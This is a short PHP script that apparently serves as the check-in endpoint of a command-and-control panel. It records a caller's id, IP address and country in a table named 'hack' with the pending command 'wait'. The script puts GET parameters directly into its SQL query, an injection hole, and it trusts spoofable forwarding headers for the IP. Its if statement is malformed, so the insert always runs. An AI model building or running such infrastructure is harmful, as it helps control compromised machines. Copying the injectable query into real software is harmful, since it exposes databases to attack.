<?php
    include_once 'sql.php';

if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

function getUserIP()
{

    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
              $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
              $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
    }
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    return $ip;
}

if( $_GET["id"] || $_GET["country"])
$id = $_GET["id"];
$user_ip = getUserIP();
$ip = $user_ip;
$country = $_GET["country"];
{
    $sql = "INSERT INTO hack (id, date, command, ip, country)
  VALUES ('$id' , NOW(), 'wait', '$ip', '$country')";
  $result = mysqli_query($conn, $sql);
}



$conn->close();
?>